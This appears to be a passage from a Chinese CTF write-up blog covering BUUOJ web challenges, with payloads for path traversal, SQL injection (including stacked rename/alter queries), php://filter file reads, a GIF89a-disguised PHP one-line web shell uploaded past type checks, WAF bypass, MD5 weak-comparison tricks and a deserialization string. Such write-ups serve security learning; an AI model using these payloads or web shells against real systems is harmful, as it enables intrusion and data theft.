class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>); <span class="comment">//打印代码</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">emmm</span>  //定义<span class="title">emmm</span>类</span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      public static function checkFile(&amp;$page)//将传入的参数赋给$page</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//声明$whitelist（白名单）数组</span></span><br><span class="line">          <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;<span class="comment">//若$page变量不存在或非字符串</span></span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;<span class="comment">//打印&quot;you can&#x27;t see it&quot;</span></span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//返回false</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//若$page变量存在于$whitelist数组中</span></span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//返回true</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$_page</span> = mb_substr(<span class="comment">//该代码表示截取$page中&#x27;?&#x27;前部分，若无则截取整个$page</span></span><br><span class="line">              <span class="variable">$page</span>,</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">          );</span><br><span class="line">          <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);<span class="comment">//url解码$page</span></span><br><span class="line">          <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">              <span class="variable">$_page</span>,</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">          );</span><br><span class="line">          <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到四个 if 语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个if语句对变量进行检验，要求$page为字符串，否则返回false</span><br><span class="line">第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</span><br><span class="line">第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中&#39;?&#39;前部分，存在则返回true</span><br><span class="line">第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true</span><br><span class="line">若以上四个if语句均未返回值，则返回false</span><br></pre></td></tr></table></figure><p>不知道为什么第二个 if 语句一直是 false，没办法只好去看下一个，<code>mb_substr</code> 函数就是截取 <code>page</code> 变量中从第0个字符到第 <code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;) </code>字符，这时又遇到一个函数，这个函数<strong>返回要查找的字符串在另一个字符串中首次出现的位置</strong> 也就是说返回 <code>page</code> 变量中 <strong>?</strong> 首次出现的位置。</p><p>所以我们在后面输入<code>?file=source.php?/ffffllllaaaagggg</code> 并没有发现 flag 所以我们在前面加 <strong>../</strong> 一直到flag出现为止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>进入先检查源代码发现没有什么特别的所以先在用户名中输入中输入1 返回<code>Input your username and password</code> 所以我们再再密码那一栏随便输入一个数登录 页面返回<code>NO,Wrong username password！！！</code>。将用户名那一栏改为<code>1&#39;</code>系统报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#39; at line 1</code>。</p><p>尝试用万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code>访问一下，便可以发现flag</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>进入靶机看到</p><p><a href="https://imgtu.com/i/6BpsYD"><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/03/14/6BpsYD.png" alt="6BpsYD.png"></a></p><p>第一步还是查看源码，然而并没有发现什么有用的信息，所以尝试一下提交<code>1‘；#</code> 返回：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;1&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;hahahah&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步查看有哪些数据表 使用<code>1&#39;;show tables;#</code> 发现有<code>1919810931114514</code> <code>words</code> 这两张表。本打算用<code>select *</code> 查看数据表内容 结果页面返回 </p><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code> </p><p><strong>preg_match() 函数</strong>主要是用来进行过滤，i是指大小写不敏感，也就是大小写都会被过滤</p><p>没办法 先查看数据表结构 <code>1&#39;;desc words;desc 1919810931114514;#</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;id&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;int(10)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;varchar(20)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始过滤的并没有alert 和 rename，我们已经知道了<code>words</code>是用来<strong>回显内容</strong>的，能不能我们把<code>1919810931114514</code>这个表更改名字为<code>words</code>,并增加相应的字段，使之回显原<code>1919810931114514</code>这个表的内容那，当然是可以的。使用<code>rename</code> <code>alter</code>来更改表名和表内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?inject&#x3D;1&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);#</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>这道题就比较简单，先查看源码发现最后有提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以我们在 url 后加上<code>?cat = dog</code>得到 flag</p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>没什么提示，先在输入框输入一个<code>1</code> 试试</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/VDvkh4pxZ2gITlS.png" alt="image-20210320115437782"></p><p>用SQL堆叠注入查询表名<code>1;show tables;</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/Gxsa7u5IPtY26gp.png" alt="image-20210320115643726"></p><p>本来想着直接查询<code>Flag</code>就能出结果，但返回了一个 nonono</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/eSNnvDYos3XuBhj.png" alt="image-20210320115914678"></p><p>之后试了很多语句去查询实在是想不出，去查了下大佬的wp</p><p>源码中的 SQL 语句是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><p>这里就需要把<code>||</code>解决掉，需要用<code>set sql_mode=PIPES_AS_CONCAT</code>解决</p><p>具体见：**<a href="https://blog.csdn.net/lixora/article/details/60572357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161621060116780274197782%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161621060116780274197782&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-60572357.first_rank_v2_pc_rank_v29&utm_term=PIPES_AS_CONCAT">lixora</a>** </p><p>payload：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><p>构造后就变成了三句语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1;</span><br><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT;</span><br><span class="line">SELECT 1,flag from flag;</span><br></pre></td></tr></table></figure><p>参考：**<a href="https://lemonprefect.cn/WriteUps/BUUOJ-Web-%E4%B8%80%E5%88%86%E9%A2%98-WriteUp-%E5%90%88%E9%9B%86.html">lemonprefect</a>** </p><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>使用 <strong>“php://filter”伪协议”</strong> 来进行包含，然后构造payload：<code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p><p>这里需要注意的是使用php://filter伪协议进行文件包含时，需要加上read=convert.base64-encode来对文件内容进行编码</p><p>发送请求得到base64编码后的flag.php文件源码</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/VtS7l9vPyD3gIsf.png" alt="image-20210320121542746"></p><p>再进行base64解码得到flag</p><p>参考：<a href="https://blog.csdn.net/qq_48175067/article/details/113189342">烦躁的程序员</a></p><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>查看源代码后发现有个<code>./Archive_room.php</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/Iprw76tHke3nzKE.png" alt="image-20210320124050462"></p><p>进入后用bp截包发现<code>secr3t.php</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/rV8sLFcgo59fXTv.png" alt="image-20210320124227388"></p><p>进入<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/MUm6vWIGPHKh9q2.png" alt="image-20210320124402930"></p><p>之后可以使用和上题一样的方法利用伪协议构造</p><p>payload：<code>?file=PHPfilter/read=convert.base64-encode/resource=flag.php</code></p><p>之后再进行 base64 解码得到 flag</p><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>一进页面就知道是一个文件上传题</p><p>所以新建一个文件后缀为：<code>.phtml</code>，写入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt; </span><br></pre></td></tr></table></figure><p><code>GIF89a</code> : 图片头文件欺骗 具体作用见 <strong><a href="https://blog.csdn.net/piaolankeke/article/details/5872876?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161623789616780274133663%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161623789616780274133663&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-5872876.first_rank_v2_pc_rank_v29&utm_term=GIF89a">piaolankeke</a></strong></p><p>上传木马，但发现要求上传的文件要为图片</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/fd9ga1yGkjiPbHW.png" alt="image-20210320193526123"></p><p>我们用 bp 截下包，再将它的<code>Content-Type</code> 的内容改为<code>image/jpeg</code>上传</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/SNTCFgh6crV1mxz.png" alt="image-20210320193801867"></p><p>上传成功</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/IfXHKpd7vQW6Sx8.png" alt="image-20210320194306231"></p><p>之后再执行下，盲猜上传文件在 <code>upload</code>文件夹中所以</p><p>payload：<code>upload/emmm.phtml</code></p><p>之后再用中国蚁剑连接 在根目录下找到 flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/NJljSbRxcZp8ywH.png" alt="image-20210320194608730"></p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>和上题类似，唯一与上题不同的地方是，在上传文件时必须要文件后缀为<code>jpg/png/gif</code>的文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/20/eoafy6w1d2LxEAp.png" alt="image-20210320195927252"></p><p>我们可以先将<code>phtml</code> 改为<code>png</code>之后再在bp中改文件后缀就ok了</p><p>之后就是与上题一样的步骤，找到flag就完事。</p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进入打开源代码发现有提示</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/J46vWOMlYF2NTH7.png" alt="image-20210323102035061"></p><p>利用bp截包然后随便传入一个数字</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/T4JRz92ZqMSbD16.png" alt="image-20210323102153495"></p><p>发现有一个<code>calc.php</code>文件，进入</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/JWgdaPkysLOBeMb.png" alt="image-20210323102237699"></p><p>可以看见过滤了一些特殊字符，然后<code>eval</code>执行我们的命令。</p><p>尝试输入字符：<code>calc.php?num=a</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/xWVFXiAHSsUlIEG.png" alt="image-20210323102427563"></p><p>发现只能传入数字，加上之前提示<code>I&#39;ve set up WAF to ensure security.</code>我们要想办法绕过<code>waf</code>。</p><h2 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h2><p>Web应用防护系统（也称为：<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用<a href="https://baike.baidu.com/item/%E5%9B%BD%E9%99%85/766689">国际</a>上公认的一种说法：Web应用<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163">安全策略</a>来专门为<a href="https://baike.baidu.com/item/Web/150564">Web</a>应用提供保护的一款产品。——<a href="https://baike.baidu.com/item/WAF/3239498?fr=aladdin">百度百科</a> </p><p>看大佬的<code>wp</code>是利用：<a href="https://www.freebuf.com/articles/web/213359.html">php的字符串解析特性绕过bypass</a></p><p>所以我们可以在<code>num</code>前加个空格绕过<code>waf</code></p><p>用<code>scandir(&quot;/&quot;)</code>获取目录，但是<code>/</code>被过滤，所以用chr(47)绕过</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/mcikQYIoa3PVn7G.png" alt="image-20210323103132394"></p><p>发现<code>f1agg</code>文件。</p><p>再利用<code>file_get_contents()</code> 函数得到flag</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>进入靶机后就一个提交的页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/rdy1Xsc2IbBK9nZ.png" alt="image-20210323193722321"></p><p>查看源码没发现什么特别的东西，查看请求头，发现 hint</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/pOuUQ8mXfCs3TxL.png" alt="image-20210323193848659"></p><p>当存在参数true时，使用原始16字符二进制格式。<br>查阅其他wp，查找到<code>ffifdyop</code>字符串经过MD5哈希之后，会变成<code>276f722736c95d99e921722cf9ed621c</code>，MySQL数据库会把HEX转换成ASCII解释，所以这几个字符相当于：<code>&#39; or &#39;6xxxxxx</code>，在MySQL中，再用做布尔型判断时，以1开头的字符串会被当作整形数（以单引号‘括起来的整形数）</p><p>提交<code>ffifdyop</code>后跳转到另一个页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/TVBwGlCarypMfRE.png" alt="image-20210323194054960"></p><p>查看其源码，发现提示</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/nczEK5fahLy9gJI.png" alt="image-20210323194133904"></p><p>这里要我们使用<code>GET</code>方式传入<code>a</code> <code>b</code> ,</p><ol><li><code>a</code> 与<code>b</code>的值不相同</li><li><code>a</code> 与<code>b</code>经过<code>md5()</code>函数后的值相同</li></ol><p><code>PHP</code>弱类型比较，在比较时，<strong>PHP</strong>会把每一个以“<code>0e</code>”开头的哈希值都解释为“<code>0</code>”，所以如果两个不同的密码经过哈希以后，其哈希值都是以“<code>0e</code>”开头的，那么<strong>PHP</strong>将会认为他们相同，即为“<code>0</code>”</p><p>查阅其他大佬的wp后，找到以下为几个<code>md5()</code>哈希后值为<code>0e</code>的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><p>我们选取器中两个传入，发现第三个页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/BMKLoOiTu1ajSC7.png" alt="image-20210323194619000"></p><p>这里要我们使用<code>POST</code>方式传入<code>param1</code> <code>param2</code> ,</p><ol><li><code>param1</code> 与 <code>param2</code> ,的值不相同</li><li><code>param1</code> 与 <code>param2</code> ,经过<code>md5()</code>函数后的值相同</li></ol><p>md5函数处理数组时直接返回null，所以两个参数都为数组类型，就可实现<code>a!==b&amp;&amp;md5(a)===md5(b)</code></p><p>所以我们用 hackbar 传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=<span class="number">1</span>&amp;param2[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>后得到flag</p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>进入靶机，直接给源码<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/QRVMlfdUvnpNuE9.png" alt="image-20210323214856763"></p><p>第一个 if 中要求我们<code>text</code>不能为空并且<code>file_get_contents()</code> 读取的返回值为和<code>welcome to the zjctf</code>相同</p><p>先尝试用<code>?text=welcome to the zjctf</code> 但没有回显什么内容，所以我们需要绕过它，这里有两种方法可以绕过：</p><ol><li><strong>php://input</strong></li></ol><p>在 bp 中加入<code>?text=php://input</code> 和 <code>welcome to the zjctf</code>，得到回显（不知为何，我回寝室这样写却得不到回显）。</p><ol start="2"><li><strong>data://text/plain</strong></li></ol><p>在 hackbar 中加入<code>?text=data://text/plain,welcome to the zjctf</code> 得到回显</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/3RrJfZKnEtSdTPi.png" alt="image-20210323230850223"></p><p>第二个if好像没什么威胁，因为<code>include($file)</code> 后提示我们<code>file</code> 为<code>useless.php</code>。</p><p>这里我们使用<code>php://filter/read=convert.base64-encode/resource=useless.php</code>得到经过base64编码后的样子</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/nrPjWMEXkp4G83H.png" alt="image-20210323231233799"></p><p>还原后，得到php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>看到有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>。</p><p>最终payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>注意：因为还要加载 useless.php 反序列化才能起效果，所以要修改原来 php 伪协议的构造，将其变为<code>file=useless.php</code></p><p>之后查看其网页源代码发现flag</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
